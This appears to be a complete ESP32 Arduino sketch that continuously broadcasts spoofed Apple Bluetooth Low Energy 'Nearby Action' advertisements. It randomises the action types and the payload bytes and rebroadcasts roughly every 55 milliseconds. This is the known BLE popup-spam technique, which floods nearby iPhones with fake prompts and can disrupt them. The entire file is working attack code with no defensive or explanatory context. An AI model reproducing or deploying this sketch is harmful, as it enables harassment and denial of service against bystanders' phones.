#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h> 
//2023
BLEAdvertising *pAdvertising;

void setup() {
  BLEDevice::init("");
  BLEServer *pServer = BLEDevice::createServer(); 
  pAdvertising = pServer->getAdvertising();
  pAdvertising->setAdvertisementType(ADV_TYPE_DIRECT_IND_HIGH);
}

BLEAdvertisementData getOAdvertisementData() {
  BLEAdvertisementData randomAdvertisementData = BLEAdvertisementData();
  uint8_t packet[17];
  uint8_t size = 17;
  uint8_t i = 0;
  packet[i++] = size - 1;   
  packet[i++] = 0xFF;        
  packet[i++] = 0x4C;     
  packet[i++] = 0x00;     
  packet[i++] = 0x0F;  
  packet[i++] = 0x05;                
  packet[i++] = 0xC1;                  
  const uint8_t types[] = { 0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0 };
  packet[i++] = types[rand() % sizeof(types)];
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;   
  packet[i++] = 0x00; 
  packet[i++] = 0x00;  
  packet[i++] = 0x10;  
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  packet[i++] = rand() % 256;
  randomAdvertisementData.addData(std::string((char *)packet, 17));
  return randomAdvertisementData;
}

void loop() {
  delay(35);
  BLEAdvertisementData advertisementData = getOAdvertisementData(); 
  pAdvertising->setAdvertisementData(advertisementData);
  pAdvertising->setMinInterval(0x20);
  pAdvertising->setMaxInterval(0x20);
  pAdvertising->setMinPreferred(0x20);
  pAdvertising->setMaxPreferred(0x20);
  pAdvertising->start();
  delay(20);
  pAdvertising->stop();
}
